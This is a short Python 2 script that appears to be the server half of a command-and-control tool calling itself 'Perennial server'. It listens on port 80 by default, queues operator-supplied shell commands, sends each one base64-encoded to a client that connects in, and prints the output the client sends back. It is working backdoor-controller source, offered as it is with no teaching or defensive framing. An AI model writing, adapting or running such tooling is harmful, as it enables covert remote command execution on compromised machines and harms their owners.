#!/usr/bin/env python

import sys
import Queue
import socket
import base64
import datetime
import argparse
import config as CFG

SIZE = 1024

def create_cmd_queue(cmds):
    cmd_queue = Queue.Queue()
    for cmd in cmds:
        cmd_queue.put(cmd)
    return cmd_queue

def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('cmds', metavar='CMDS', type=str, nargs='+')
    parser.add_argument('-p', '--port')
    return parser.parse_args()

def main():
    args = get_args()
    CMDS = args.cmds
    PORT = int(args.port) if args.port else 80

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', PORT))
    s.listen(1)
    cmd_queue = create_cmd_queue(CMDS)
    print '[+] Perennial server started on {}.'.format(PORT)

    while True:
        if cmd_queue.empty():
            print '[-] Finished with commands'
            break
        conn, addr = s.accept()
        print '[i] Connected By: {} at {}'.format(addr, datetime.datetime.now())
        cmd = cmd_queue.get()
        print '[+] Sending Command:', cmd
        conn.send(base64.b64encode(cmd))
        stdout = conn.recv(SIZE)
        print base64.b64decode(stdout)
        conn.close()

if __name__ == '__main__':
    main()
